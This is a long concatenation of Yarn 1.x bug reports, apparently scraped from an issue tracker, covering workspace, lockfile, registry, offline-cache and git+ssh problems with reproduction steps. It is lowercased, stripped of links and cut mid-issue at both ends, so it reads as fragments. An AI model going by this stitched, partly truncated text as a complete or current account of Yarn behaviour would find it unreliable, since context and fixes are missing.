trace: error: spawn e2big at _errnoexception (util.js:1003:13) at childprocess.spawn (internal/child_process.js:330:11) at object.exports.spawn (child_process.js:499:9) at /usr/local/cellar/yarn/1.5.1/libexec/lib/cli.js:30226:24 at new promise (<anonymous>) at new f (/usr/local/cellar/yarn/1.5.1/libexec/lib/cli.js:23451:28) at /usr/local/cellar/yarn/1.5.1/libexec/lib/cli.js:30225:12 at run (/usr/local/cellar/yarn/1.5.1/libexec/lib/cli.js:41582:7) at blockingqueue.maybepushconcurrencyqueue (/usr/local/cellar/yarn/1.5.1/libexec/lib/cli.js:41597:7) at blockingqueue.shift (/usr/local/cellar/yarn/1.5.1/libexec/lib/cli.js:41592:10)
``` rolling back to an older version of yarn makes the error go away
`v1.4.0` suffers from the same issue as well
only going back to `v1.3.2` makes the issue go away
**if the current behavior is a bug, please provide the steps to reproduce.** any `yarn` script command that writes to disk seems to be returning this, such as `yarn install`
this might be a duplicate of
`yarn workspace <workspace> add <package> ev` adds `<package>` to `<workspace>` `dependencies`
**if the current behavior is a bug, please provide the steps to reproduce.**
it can be reproduced with the most minimal workspace setup: `package.json` with `private` and `workspaces` correctly setup; a freshly init `packages/<package>`; no root dependencies.
i want to use a local (mocked) version of a published package (i2c-bus) in my main project in place of the real thing, so i use `yarn link` to link my local copy into the main project
the published version of i2c-bus has this script in its package.json: "install": "node-gyp rebuild" ...but my local version doesn\'t use node-gyp since it\'s just a mock
so my local version of package.json doesn't have an install script
when i do yarn install on my main project, the package.json of my linked local copy of i2c-bus is ignored and the install script from the i2c-bus .yarn-metadata.json (in the yarn cache) is run instead
then node-gyp fails, because it doesn't find any of the stuff node-gyp needs in my local copy of i2c-bus
i know that it is using the .yarn-metadata.json as the source of the install script, because if i edit .yarn-metadata.json by hand and replace "node-gyp rebuild" with "echo \\"barfoo\\"", my yarn install works fine.
when using `yarn add` to update a dependency in a library inside a workspace, it keeps both the old and new version in the lockfile
if someone later runs `yarn install`, the lockfile gets updated and the old version is cleaned up
this doesn't seem to affect version locking, but it's annoying when you update a package and commit, then a coworker ends up with file changes after they run `yarn install`
**if the current behavior is a bug, please provide the steps to reproduce.**
have a workspace with at least 1 project in it, e.g
in the project directory: `yarn add lodash@1` `yarn add lodash@2`
check the `yarn.lock` file - it now contains 2 versions of `lodash`, even though nothing is referencing the older version.
`yarn install` - the lockfile now only contains the latest instance of `lodash`
installing dependencies for fails silently as `karma-mocha-webworker` never ends up in `node_modules/` directory
running `yarn add karma-mocha-webworker` or even `npm install` installs the package correctly
**if the current behavior is a bug, please provide the steps to reproduce.** - clone
- run `yarn`
- now `karma-mocha-webworker` should be in `node_modules/`
- instead, `ls node_modules | grep -i webworker ; echo $?` returns `1` instead of `0`
`yarn run --silent` doesn't suppress stderr **if the current behavior is a bug, please provide the steps to reproduce.** for example, imagine this script section of a package.json file
"scripts": { "git-is-clean": "git diff-index --exit-code --shortstat --line-prefix \'uncommited changes!\' head --", "deploy": "yarn run --silent git-is-clean && firebase deploy" },
``` if the working directory is not clean, the output of `yarn run deploy` would be ```
yarn run v1.3.2
$ yarn run --silent git-is-clean && firebase deploy
uncommited changes! 2 files changed, 150 insertions(+), 7 deletions(-)
error command failed with exit code 1.
error command failed with exit code 1.
info visit for documentation about this command.
``` note the duplicated `error command failed with exit code 1.`
every level of nesting that fails will add one of these lines.
if the output showed which command failed, i could sorta see this being a feature and not a bug
for example
error command "git-is-clean" failed with exit code 1.
error command "deploy-staging" failed with exit code 1.
but as is, it's just clutter.
`yarn` doesn't add the directory for commands of globally installed packages (`~/.yarn/bin`) to `$path`, hence these commands cannot be invoked after having them added using `yarn`.
`yarn upgrade --scope @angular` has upgrade all dependencies
**if the current behavior is a bug, please provide the steps to reproduce.**
say `package.json` and `yarn.lock`.
{ "dependencies": { "@angular-mdl/core": "^4.0.0", "@angular/core": "^2.4.9", "left-pad": "^1.0.0" }
# this is an autogenerated file
do not edit this file directly.
# yarn lockfile v1 "@angular-mdl/core@^4.0.0": version "4.0.0" resolved " #9415a3340cbeeac01739e5777971fec307b13c17" "@angular/core@^2.4.9": version "2.4.9" resolved " #85dca2afa4021be91512c97597702ac8d73092e6" left-pad@^1.0.0: version "1.0.0" resolved " #c84e2417581bbb8eaf2b9e3d7a122e572ab1af37"
``` while `@angular` scope upgraded, `@angular-mdl/core` and `left-pad` are also upgraded to latest compatible version.
$ yarn upgrade --scope @angular
yarn upgrade v1.4.1
success saved lockfile.
success saved 3 new dependencies.
info direct dependencies
@angular-mdl/core@4.0.8
@angular/core@2.4.10
left-pad@1.2.0
info all dependencies
@angular-mdl/core@4.0.8
@angular/core@2.4.10
left-pad@1.2.0
`yarn tag list` prompts for email/password when trying to list tags
**if the current behavior is a bug, please provide the steps to reproduce.** ```
$ yarn tag list inferno
yarn tag v1.3.2
warning package.json: "dependencies" has dependency "lodash" with range "^3.10.1" that collides with a dependency in "devdependencies" of the same name with version "^4.13.1"
[1/3] logging in...
info npm username: ....
info npm email: ....
question npm password:
`yarn workspace {name} {command} --anything` does not forward the flags to `{command}` this is due to the implementation in `src/commands/workspace.js`: ```
export async function run(config: config, reporter: reporter, flags: object, args: array<string>): promise<void> { ..
const [workspacename, ...rest] = args; ..
try { await child.spawn(node_bin_path, [yarn_bin_path, ...rest], {
``` `rest` is the remaining parameters, but does not include `flags` **if the current behavior is a bug, please provide the steps to reproduce.**
example, make a monorepo/workspace project with a package named `foo`
run `yarn workspace foo version --new-version 0.1.0` the `workspace` command executes `yarn version` in the `foo` package without the `--new-version` flag.
using yarn in lerna with workspaces to manage dependencies
running the following ```sh
yarn licenses list
within a package in the monorepo, lists dependent packages of entire monorepo as opposed to dependencies of the package i am requesting license list from
**if the current behavior is a bug, please provide the steps to reproduce.**
run above command.
if i run this
$ yarn add github:studio-42/elfinder
it will successfully install the package, but it will add this to the lockfile:
"elfinder@github:studio-42/elfinder": version "" resolved " "
this is because the `package.json` file in the github repo is missing the `version` field
next, i'll run this
$ yarn add some-other-package
and get this error:
yarn add v1.3.2
[1/4] resolving packages...
error package "elfinder@" doesn\'t have a "version".
info visit for documentation about this command.
because of the empty version in the lockfile
**if the current behavior is a bug, please provide the steps to reproduce.** see above steps.
when attempting to publish a scoped package for the first time, even with the following in `package.json`: ``` json
{ "publishconfig": { "access": "public" }
``` `yarn publish` still fails with "you must sign up for private packages"
note this only happens on the initial publish; once the package has been created, subsequent publish works as expected
**if the current behavior is a bug, please provide the steps to reproduce.** create an arbitrary scoped package with the above `publicconfig` settings in `package.json`, and try `yarn publish`
when overriding an npm package (`webrtcsupport`) whose published version is 2.2.0 with a github source with package.json version 2.2.1, `yarn install` fails with the following error: `error an unexpected error occurred: "couldn\'t find any versions for \\"webrtcsupport\\" that matches \\"2.2.1\\"".` [yarn-error.log]( **if the current behavior is a bug, please provide the steps to reproduce.** 1
`yarn add --flat webrtcsupport@ simplewebrtc` 2
select the 2.2.1 option for webrtcsupport 3
`yarn install --non-interactive`
when having a yarn workspace, adding one of the packages to another and then executing `yarn install` throws this error: `error: enoent: no such file or directory, copyfile '/users/tim/library/caches/yarn/v1/npm-jsonfile-4.0.0-8771aae0799b64076b76640fca058f9c10e33ecb/changelog.md' -> '/users/tim/code/prisma-deployment-test/cli/node_modules/prisma-yml/node_modules/jsonfile/changelog.md'` [complete yarn-error.log]( **if the current behavior is a bug, please provide the steps to reproduce.**
git clone git@github.com:graphcool/prisma.git
git checkout 97b85c6d7ac0f8eabbb481b4e9b81f99d67d8f99
cd cli/packages/prisma-yml
yarn install
cd ../prisma-cli-engine/
yarn add -e prisma-yml
yarn install #boom
yarn install incorrectly behaves when both `--frozen-lockfile` and `--force` are present
**if the current behavior is a bug, please provide the steps to reproduce.**
clone
examine `package.json` and `yarn.lock` in this repository
note that while `yarn.lock` specifies the dependency (`lodash` used as an example, but the exact package is not important) at one version, `package.json` has the dependency version updated.
run `yarn install --frozen-lockfile`
note that it bails out with an error that lockfile should be updated.
run `yarn install --frozen-lockfile --force`
note that the command succeeds
the version installed in `node_modules` is different than lockfile specifies, but lockfile is not updated
this behaviour is identical as if `yarn install --pure-lockfile` was run at this point.
finally run `yarn install` and confirm that lockfile is indeed updated.
@yarnpkg/lockfile fails to parse `yarn.lock`, raising the error `syntaxerror: unknown token 3:1 in lockfile`
the last release for this package was from before the 1.0.0 release, and manually building from the yarn source produced a package that worked, so its stands to reason that the major version may have introduced breaking changes
**if the current behavior is a bug, please provide the steps to reproduce.**
simply take any `yarn.lock` file, and parse it as described in the [readme](
if i run ```yarn install --flat``` and there is a version conflict for a private bower-component, the value of the resultions entry, which will be added by yarn, is wrong.
yarn just adds the version number to the resolutions entry, but it should contains the hole url plus the version which should be installed
**if the current behavior is a bug, please provide the steps to reproduce.**
for example, i have the following package.json
"dependencies": { "@bower_components/myprivatepackage1": "<url to my gitlab>#2.6.0", "@bower_components/myprivatepackage2": "<url to my gitlab>#1.0.0" }
``` there is a version conflict for ```myprivatepackage1``` (```myprivatepackage2``` referes ```myprivatepackage1#2.5.0```, and i wan't to install v2.5.0 instead of v2.6.0)
for this purpose i run ```yarn install --flat``` to specify the version which should be installed, in that case i choose v2.5.0.
yarn than append the following resolutions entry to my package.json
"resolutions": { "@bower_components/myprivatepackage1": "2.5.0" }
installation of packages fails when installing in production, yarn 1.3.2 errors with: `error: cannot find module 'are-we-there-yet'` this does *not* happen with yarn 0.18.1, where the installs complete successfully
**if the current behavior is a bug, please provide the steps to reproduce.**
these are the relevant dependencies for a particular package that fails: ```
"dependencies": { "@meanie/angular-analytics": "^2.0.0", "@meanie/angular-api": "^3.0.1", "@meanie/angular-convert": "^2.0.1", "@meanie/angular-duplicate-requests-filter": "^2.0.0", "@meanie/angular-focus": "^2.0.0", "@meanie/angular-key-codes": "^2.0.0", "@meanie/angular-log": "^2.0.0", "@meanie/angular-modal": "^3.0.0", "@meanie/angular-storage": "^2.0.1", "@meanie/angular-store": "^2.0.1", "@meanie/angular-url": "^2.0.1", "angular": "1.6.8", "angular-animate": "1.6.8", "angular-cookies": "1.6.8", "angular-messages": "1.6.8", "angular-sanitize": "1.6.8", "angular-touch": "1.6.8", "angular-ui-router": "^0.4.2", "fastclick": "^1.0.6", "marked": "^0.3.9", "meanie-angular-form-controls": "^1.4.5", "moment": "^2.20.1", "ng-infinite-scroll": "^1.3.0", "raven-js": "^3.21.0" }, "devdependencies": { "babel-polyfill": "^6.23.0", "babel-preset-es2015": "^6.24.0", "browser-sync": "^2.18.6", "chalk": "^1.1.3", "del": "^2.2.2", "git-rev-sync": "^1.8.0", "gulp": "git+ #4.0", "gulp-angular-templatecache": "^2.0.0", "gulp-autoprefixer": "^3.1.1", "gulp-babel": "^6.1.2", "gulp-concat": "^2.6.1", "gulp-csso": "^3.0.0", "gulp-file": "^0.4.0", "gulp-htmlclean": "^2.7.16", "gulp-inject": "^4.3.0", "gulp-ng-annotate": "^2.1.0", "gulp-ng-constant": "^1.1.0", "gulp-plumber": "^1.1.0", "gulp-preprocess": "^2.0.0", "gulp-remove-empty-lines": "^0.0.8", "gulp-remove-html-comments": "^1.0.1", "gulp-rename": "^1.2.2", "gulp-sass": "^3.1.0", "gulp-sourcemaps": "^2.4.1", "gulp-uglify": "^2.1.2", "gulp-wrapper": "^1.0.0", "http-proxy-middleware": "^0.17.4", "merge-stream": "^1.0.1", "npm-run-all": "^4.0.2", "mime": "^1.3.4", "netlify-cli": "^1.2.2", "replace-in-file": "^2.5.0", "rimraf": "^2.6.1", "s3-cli": "^0.13.0", "serve-static": "^1.12.1", "yargs": "^10.0.3" }
$ yarn licenses list --production
yarn licenses v1.3.2
[--] 0/2 async@2.6.0
license: mit
url:
lodash@4.17.4 license: mit url:
**please mention your node.js, yarn and operating system version.**
in package.json, if i put a package "merge": "^1.2.0" in "devdependencies", generate a yarn.lock, if i move the package from "devdependencies" to "dependencies" and rerun yarn install, the lock file does not change
subsequently the merge package will not be installed if `yarn install --production` is executed
**if the current behavior is a bug, please provide the steps to reproduce.**
`yarn global list` doesn't output a dependency tree of packages, unlike `yarn list`
here is the output of `yarn global list`: ```
yarn global v1.3.2
info "npm-check-updates@2.13.0" has binaries: - npm-check-updates - ncu
info "typescript@2.6.2" has binaries: - tsc - tsserver
done in 1.77s.
``` flags like `--depth` and `--pattern` also do not work
**if the current behavior is a bug, please provide the steps to reproduce.** 1
install a couple of packages with `yarn global add`
exec `yarn global list`
i cannot install a git+ssh repo, yarn's warning is like:
couldn\'t find match for "warning:" in "_c" for "git@gitlab.xxx:xxx/xxx.git".
**if the current behavior is a bug, please provide the steps to reproduce.** this message was very confusing to me, but i manage to find the reason in the source code, it's
because someone in my team changed `~/.ssh/config` to this:
userknownhostsfile /dev/null ...
which makes ssh warn the message below every time i or yarn use `git ls-remote`:
warning: permanently added 'gitlab.xxxxx.com' (rsa) to the list of known hosts.
then yarn just [took the first word]( #l429) as the sha of this package and produced the confusing warning above.
after i changed `userknownhostsfile` to `~/.ssh/known_host`, the problem was solved.
both `npm start` and `node index.js` display the `process.stderr.write` message in this handler, but not `yarn start` ```javascript
process.on('uncaughtexception', err => { process.stderr.write(`caught exception
err: ${err}`) process.exit(1)
<img width="693" alt="screen shot 2017-11-27 at 23 15 43" src=" "> for it to display when using `yarn start`, one needs to add a `\ ` to the template literate
```javascript
process.on('uncaughtexception', err => { process.stderr.write(`caught exception
err: ${err}\ `) process.exit(1)
<img width="599" alt="screen shot 2017-11-27 at 23 14 02" src=" "> more precisely, everything up until the newline will be flush to the buffer, so if the `\ ` is in the middle, everything before will be shown **if the current behavior is a bug, please provide the steps to reproduce.**
the --tilde flag does not install the latest patch version matching the version i specify
it does not put a tilde in my package.json, either
for instance, take the package moment
currently, moment's versions include 2.18.0 and 2.18.1
as such, if i run `yarn add moment@2.18.0 --tilde`, i expect to install version 2.18.1, and to add this line to my package.json file: `"moment": "~2.18.0"`
instead, yarn installs version 2.18.0, and adds this line to my package.json file: `"moment": "2.18.0"
**if the current behavior is a bug, please provide the steps to reproduce.**
changing directory into a workspace and using `yarn add nock` adds `nock` to the `dependencies` for the package.json, rather than updating the version in `devdependencies`
different versions of `nock` are then present within the same package.json in the `dependencies` and `devdependencies`
i've created a repo so you can easily replicate, with a pr showing the erroneous result, [here](
yarn workspaces do not create node_modules/.bin symlinks for nested dependencies that have a bin specified in their package.json
original yarn issue: **if the current behavior is a bug, please provide the steps to reproduce.** create yarn workspace
create two workspace packages, ``one`` and ``two``
add ``two`` as a dependency to ``one``
add ``eslint`` as a dependency to ``two`` example: [chrisblossom/yarn-issue-4964](
we've got a certain transitive dependency that is always resolved correctly, but the name of this dependency is sometimes quoted depending on which yarn command was executed last
if i run `yarn install` in our project, `yarn.lock` always ends up containing this (dependency name not quoted): ```
axios@contentful/axios#fix/https-via-http-proxy: version "0.17.1" resolved " " dependencies: follow-redirects "^1.2.5" is-buffer "^1.1.5"
``` if i run `yarn upgrade` in our project, `yarn.lock` always ends up containing this (dependency name quoted): ```
"axios@github:contentful/axios#fix/https-via-http-proxy": version "0.17.1" resolved " " dependencies: follow-redirects "^1.2.5" is-buffer "^1.1.5"
``` so, even if there are no actual version changes, install and upgrade can cause unnecessary lockfile changes that the other command reverts later
removing `node_modules` doesn't help
**if the current behavior is a bug, please provide the steps to reproduce.** this is reproducible with a barebones `package.json` with these two dependencies: ```
"dependencies": { "contentful": "~4.6.2", "left-pad": "stevemao/left-pad"
``` now, running `yarn upgrade` quotes the axios transitive dependency, and `yarn install` reverts the quoting
this seems to have something to do with multiple github dependencies, because if `left-pad` is removed, both yarn commands use quotes in the axios dependency name
note that `contentful` doesn't use `left-pad` even transitively, so just the existence of another github dependency is enough to trigger this behaviour.
sub dependencies .bin symlinks override top level dependencies .bin symlinks in some cases (seems to be depending on which top level package is first when sorted alphabetically)
likely introduced in **if the current behavior is a bug, please provide the steps to reproduce.** example:
1) set up a project with a local tarball mirror and pruning ([sample project](
2) set the resolution for a scoped package to a file in package.json.
3) clear the global yarn cache.
4) run a `yarn install --offline`.
yarn will first try and resolve the package to the tarball which will fail
it will then look in the global cache but the scoped cache dir (in this case `npm-@types`) doesn't exist and the install will fail [here]( #l109)
this seems like a very niche use case but our ci machines do a build with this exact setup so we can't use file resolutions until this is resolved
@lelandrichardson
yarn shows the just added package as outdated
same behavior on future attempts after upgrading
(does not change `yarn.lock`)
$ yarn add ' #v1.1.2-#279-require-twice-protection'
yarn add v1.3.2
warning package.json: no license field
warning no license field
[1/4] resolving packages...
error couldn\'t find match for "v1.1.2-" in "_c" for " ".
info visit for documentation about this command.
``` but this works: ```
yarn add 'linagora/ical.js#v1.1.2-#279-require-twice-protection' yarn add v1.3.2
warning package.json: no license field
warning no license field
[1/4] resolving packages...
[2/4] fetching packages...
[3/4] linking dependencies...
[4/4] building fresh packages...
success saved 1 new dependency.
ical.js@1.1.2
warning no license field
done in 14.02s.
``` **please mention your node.js, yarn and operating system version.** arch linux:
yarn warns about missing peer dependencies (in this case react) even if the said dependency is in `package.dependencies`
**if the current behavior is a bug, please provide the steps to reproduce.** - clone `git@github.com:fathyb/yarn-unmet-peer-deps.git`
- you should see this :
warning " > material-ui@1.0.0-beta.19" has unmet peer dependency "react@^15.3.0 || ^16.0.0".
warning " > material-ui@1.0.0-beta.19" has unmet peer dependency "react-dom@^15.3.0 || ^16.0.0".
warning "material-ui > react-event-listener@0.5.1" has unmet peer dependency "react@^15.3.0 || ^16.0.0".
warning " > react-jss@7.2.0" has unmet peer dependency "react@>=0.13".
warning "material-ui > react-popper@0.7.4" has unmet peer dependency "react@0.14.x || ^15.0.0 || ^16.0.0".
warning "material-ui > react-popper@0.7.4" has unmet peer dependency "react-dom@0.14.x || ^15.0.0 || ^16.0.0".
warning "material-ui > react-scrollbar-size@2.0.2" has unmet peer dependency "react@^15.3.0 || ^16.0.0".
warning "material-ui > react-transition-group@2.2.1" has unmet peer dependency "react@>=15.0.0".
warning "material-ui > react-transition-group@2.2.1" has unmet peer dependency "react-dom@>=15.0.0".
warning "material-ui > recompose@0.26.0" has unmet peer dependency "react@^0.14.0 || ^15.0.0 || ^16.0.0".
warning " > material-ui-icons@1.0.0-beta.17" has unmet peer dependency "react@^15.3.0 || ^16.0.0".
warning " > material-ui-icons@1.0.0-beta.17" has unmet peer dependency "react-dom@^15.3.0 || ^16.0.0".
warning " > mobx-react@4.3.4" has unmet peer dependency "react@^0.13.0 || ^0.14.0 || ^15.0.0 || ^16.0.0".
warning "react-hot-loader > redbox-react@1.5.0" has unmet peer dependency "react@^0.14.0 || ^15.0.0 || ^16.0.0-beta || ^16.0.0".
warning "react-hot-loader > redbox-react@1.5.0" has unmet peer dependency "react-dom@^0.14.0 || ^15.0.0 || ^16.0.0-beta || ^16.0.0".
if there exists a devdependency when upgrading a package, yarn moans about this because it seems to want to add a new dependency
but doesn't do anything
**if the current behavior is a bug, please provide the steps to reproduce.**
yarn add @types/node -d
yarn upgrade @types/node ```
`warning "@types/node" is already in "devdependencies"
please remove existing entry first before adding it to "dependencies".
run `yarn install` with package.json present and no `yarn.lock` present.
immediately after run `yarn install --frozen-lockfile` 3
errors states that `error your lockfile needs to be updated, but yarn was run with --frozen-lockfile.`
run `yarn install` again - no changes are made to `yarn.lock` **if the current behavior is a bug, please provide the steps to reproduce.**
when running `yarn upgrade-interactive --latest` it suggests to install version 1.0.1 **if the current behavior is a bug, please provide the steps to reproduce.** ```
yarn add react-refetch@1.0.3-0
yarn upgrade-interactive --latest
a `plink: unknown option "-p"` error is shown
yarn add git+ssh://git@github.com:22/substack/node-mkdirp.git
yarn add v1.2.1
info no lockfile found.
[1/4] resolving packages...
error command failed.
exit code: 128
command: git
arguments: ls-remote --tags --heads ssh://git@github.com:22/substack/node-mkdirp.git
directory: c:\\yarn-issue
plink: unknown option "-p"
fatal: could not read from remote repository.
``` **if the current behavior is a bug, please provide the steps to reproduce.**
attempt to install a package over git+ssh, specifying a port number, on windows with git configured to use plink
when researching other git+ssh issues, i found this command, which works: `yarn add git+ssh://git@github.com/substack/node-mkdirp.git` but, when specifying a port number, it does not: `yarn add git+ssh://git@github.com:22/substack/node-mkdirp.git` my company uses a private bitbucket server that runs over a non-standard port, so i'm not able to use yarn with our private dependencies like i can with npm, at least on windows/plink
plink's documentation ( ~sgtatham/putty/0.60/htmldoc/chapter7.html) specifies that ports are specified by `-p`
if yarn is using lowercase `-p` instead, that would explain the error.
![image]( **if the current behavior is a bug, please provide the steps to reproduce.**
no clear step to reproduce
it occur only after upgrading to v1.2.1
it might related to my network condition.
i have a simple package.json with the following dependency:
"dependencies": { "mapbox-gl": "^0.22.0"
mapbox-gl in turn has the following problematic dependencies:
"dependencies": { [...] "mapbox-gl-shaders": "mapbox/mapbox-gl-shaders#de2ab007455aa2587c552694c68583f94c9f2747", "mapbox-gl-style-spec": "mapbox/mapbox-gl-style-spec#83b1a3e5837d785af582efd5ed1a212f2df6a4ae", }
with the usual offline .yarnrc:
yarn-offline-mirror "./offline-cache"
yarn-offline-mirror-pruning true
``` then i run:
$ yarn install # works fine
$ rm -r node_modules
$ yarn install --offline
[1/4] resolving packages...
error can\'t make a request in offline mode (" ")
using yarn with workspaces while building theia i now get erros like: ```
@theia/cli: > yarn run clean && yarn run build
@theia/cli: npm info lifecycle @theia/cli@0.1.1~prepare: @theia/cli@0.1.1
@theia/cli: error could not open cafile: eisdir: illegal operation on a directory, read
@theia/cli: error could not open cafile: eisdir: illegal operation on a directory, read ``` **if the current behavior is a bug, please provide the steps to reproduce.** you can reproduce with; ```
git clone \\
&& cd theia \\
&& yarn ```
`yarn add private_package` does not work - i'm never authenticated
(this happens with a freshly set-up `~/.yarnrc` with not pre existing `~/.npmrc`) **if the current behavior is a bug, please provide the steps to reproduce.**
* get a private npm repository (i used artifactory)
* make full access bound to a specific user (note: read only needs user as well - no anonymous!)
* setup the registry in yarn: `yarn config set registry `
* publish a sample package (this works nicely)
* attempt to get that package using `yarn add private_package`
running "yarn outdated" displays a lists of dependencies with no urls **if the current behavior is a bug, please provide the steps to reproduce.** not sure, yarn is installed with "brew install yarn", version is v1.1.0
same v1.1.0 version on another machine works fine.
in [an example app from the draft.js project]( if i run `yarn install` i end up with both `node_modules/react` and `node_modules/draft-js/node_modules/react`
the second is a duplicate, and causes the ["refs must have an owner" warning]( to compare - if i `rm -rf node_modules && npm install` in that same directory, i do not end up with `node_modules/draft-js/node_modules/react`
**if the current behavior is a bug, please provide the steps to reproduce.**
if you clone the draft.js github repo, `yarn install && yarn build`, and then follow the `readme` in [the `universal` example]( you should see the warning in the console and the `node_modules` situation i described above.
running `yarn add foo` inside a workspace directory does two unexpected things;
it installs the newly added dependency in `/my-workspace/node_modules/foo`, whereas i would expect it to install it to the workspace root, e.g.: `/node_modules/foo`
it installs *all* other dependencies of `my-workspace` to `/my-workspace/node_modules` **if the current behavior is a bug, please provide the steps to reproduce.**
see also: 1
create an empty directory(`workspace-1`), and add a minimal `package.json` file.
in root `package.json`, set `"workspaces": [ "./*" ]`
cd workspace-1
yarn add lodash.assign
by now, i'd have (also see [screenshot](
/workspace-1 /node_modules /lodash.assign
`global upgrade` and `global upgrade-interactive` seem not work
**if the current behavior is a bug, please provide the steps to reproduce.** ```
$ yarn global add prettier@1.6.1
$ yarn global upgrade-interactive --latest
running yarn init yields: ```
$ yarn init
yarn init v1.0.2
error an unexpected error occurred: "can\'t answer a question unless a user tty".
yarn does not honor .npmrc
**if the current behavior is a bug, please provide the steps to reproduce.**
we require authentication for one of our repositories and we used to do this by specifying the authentication in .npmrc
this worked up to 0.28.4 but broke in 1.0.0
an npm user, i naively tried:
$ yarn install -g node@8.4.0
yarn install v1.0.1
error `--global` has been deprecated
please run "yarn global node@8.4.0" instead.
great that it provides a suggestion! but when i tried that command:
$ yarn global node@8.4.0
yarn global v1.0.1
error invalid subcommand
try "add, bin, ls, list, remove, upgrade, upgrade-interactive"
so it prompted me to use an invalid command.
when having a custom registry in `.npmrc`, yarn doesn't use it and keep using the default npm registry instead
this results in errors during install with:
error couldn\'t find package "aaa" on the "npm" registry.
``` **if the current behavior is a bug, please provide the steps to reproduce.**
create a npmrc file with a custom registry:
registry =
then try to install your dependencies from the custom registry
running yarn introduces an extraneous dependency
this causes npm ls to subsequently return non-zero exit code which is breaking our ci system
**if the current behavior is a bug, please provide the steps to reproduce.** package.json ```json
{ "name": "foo", "version": "1.0.0", "main": "index.js", "license": "mit", "dependencies": { "nyc": "^11.2.1" }
run `npm ls`
run `echo $?` it outputs 1 because of extraneous dependencies: ```
npm err! extraneous: archy@1.0.0 /users/camwest/desktop/foo/node_modules/archy
npm err! extraneous: caching-transform@1.0.1 /users/camwest/desktop/foo/node_modules/caching-transform
npm err! extraneous: convert-source-map@1.5.0 /users/camwest/desktop/foo/node_modules/convert-source-map
npm err! extraneous: debug-log@1.0.1 /users/camwest/desktop/foo/node_modules/debug-log
npm err! extraneous: find-cache-dir@0.1.1 /users/camwest/desktop/foo/node_modules/find-cache-dir
npm err! extraneous: istanbul-lib-hook@1.0.7 /users/camwest/desktop/foo/node_modules/istanbul-lib-hook
npm err! extraneous: istanbul-lib-instrument@1.8.0 /users/camwest/desktop/foo/node_modules/istanbul-lib-instrument
npm err! extraneous: istanbul-lib-report@1.1.1 /users/camwest/desktop/foo/node_modules/istanbul-lib-report
npm err! extraneous: istanbul-lib-source-maps@1.2.1 /users/camwest/desktop/foo/node_modules/istanbul-lib-source-maps
npm err! extraneous: istanbul-reports@1.1.2 /users/camwest/desktop/foo/node_modules/istanbul-reports
npm err! extraneous: merge-source-map@1.0.4 /users/camwest/desktop/foo/node_modules/merge-source-map
npm err! extraneous: resolve-from@2.0.0 /users/camwest/desktop/foo/node_modules/resolve-from
npm err! extraneous: spawn-wrap@1.3.8 /users/camwest/desktop/foo/node_modules/spawn-wrap
npm err! extraneous: test-exclude@4.1.1 /users/camwest/desktop/foo/node_modules/test-exclude
npm err! extraneous: yargs@8.0.2 /users/camwest/desktop/foo/node_modules/yargs
npm err! extraneous: yargs-parser@5.0.0 /users/camwest/desktop/foo/node_modules/yargs-parser
files created in postinstall steps are not added to `.yarn-integrity`
**if the current behavior is a bug, please provide the steps to reproduce.** ```bash
yarn add postcss
``` `postcss#caniuse-api/features.js` exists immediately after install (`yarn add postcss`), but is not listed in `.yarn-integrity`.
if i have eslint 4.5.0 installed and 4.6.1 is the latest version: `yarn upgrade eslint -l` says "all of your dependencies are up to date." and eslint remains at version 4.5.0
`yarn upgrade eslint --latest` updates eslint to 4.6.1 **if the current behavior is a bug, please provide the steps to reproduce.**
yarn add eslint@4.5.0
yarn upgrade eslint -l
yarn upgrade eslint --latest
when having a file dependency that has more file dependencies, these second-level dependencies are referenced in cache, e.g.:
{ name: "x" dependencies: { "a": "file:../../a" }
{ name: "a", dependencies: { "b": "../b" }
would result in a lock entry like:
``` "a@file:../../a": dependencies: "b" "file:../../../../../library/caches/yarn/v1/npm-b"
instead of (yarn 0.27.5):
``` "a@file:../../a": dependencies: "b" "file:../b"
``` **if the current behavior is a bug, please provide the steps to reproduce.** create two chains of dependencies, see: especially #l8
yarn install --flat fails
returns invariant violation: expected manifest **if the current behavior is a bug, please provide the steps to reproduce.** create a package.json with this:
{ "name": "test", "private": true, "version": "0.0.1", "devdependencies": { "standard": "^10.0.3" }, "resolutions": { "doctrine": "2.0.0", "strip-ansi": "4.0.0", "ansi-regex": "3.0.0", "acorn": "5.1.2", "string-width": "2.1.1", "is-fullwidth-code-point": "2.0.0", "minimist": "1.2.0", "find-up": "2.1.0", "path-exists": "3.0.0" }
type yarn install --flat and it will not work
if you removed the resolutions, it will work.
prior to v1, if you ctrl+c out of `yarn upgrade-interactive`, it would exit silently
now, it will exit with this error: ```
error: promise rejected with value: undefined at /usr/local/cellar/yarn/1.0.1/libexec/lib/cli.js:71593:12 at array.foreach (native) at eventemitter.<anonymous> (/usr/local/cellar/yarn/1.0.1/libexec/lib/cli.js:71589:24) at emittwo (events.js:106:13) at eventemitter.emit (events.js:191:7) at emit (/usr/local/cellar/yarn/1.0.1/libexec/lib/cli.js:67713:11) at processemit [as emit] (/usr/local/cellar/yarn/1.0.1/libexec/lib/cli.js:67786:5)
``` **if the current behavior is a bug, please provide the steps to reproduce.**
run `yarn upgrade-interactive`
type `ctrl+c`
- `yarn run somescript --help` displays yarn help, and doesn't execute the script
- `yarn run somescript -- --help` executes the script and passes along `--help` as an arg, _but_ it displays the deprecation warning:
> from yarn 1.0 onwards, scripts don\'t require "--" for options to be forwarded
in a future version, any explicit "--" will be forwarded as-is to the scripts
so it seems like the behavior is inconsistent with other args for `--help`
if you run `yarn install --help`, the description of `--frozen-lockfile` is "don\'t generate a lockfile and fail if an update is needed"
if you run `yarn install --frozen-lockfile` in a project without a yarn.lock, it generates a new yarn.lock
**if the current behavior is a bug, please provide the steps to reproduce.** 1
go to a project without a yarn.lock
run `yarn install --frozen-lockfile`.
when using the "registry" parameter in .npmrc and .yarnrc, you must now use a trailing slash
otherwise it will fail with an error "couldn\'t find package "<package-name>" on the "npm" registry." **if the current behavior is a bug, please provide the steps to reproduce.**
1) create .yarnrc with the following contents:
registry " "
2) yarn add react --verbose
3) see the following:
verbose 0.59 performing "get" request to " ".
note -- there is no /npm on the end
attempting to remove a package from inside a workspace fails with: ```
error no lockfile in this directory
run `yarn install` to generate one
``` **if the current behavior is a bug, please provide the steps to reproduce.** ```sh
$ cd packages/some-package
$ yarn remove some-dependency
yarn remove v1.0.1
error no lockfile in this directory
run `yarn install` to generate one
the typescript compiler causes node.js to run out of memory while compiling a project symlinked with yarn workspaces
this could be a bug in yarn or typescript, but since this issue did not occur before i switched lerna to `useworkspaces`, i think it might be the prior
<summary>node.js crash (note the hasownproperty key)</summary>
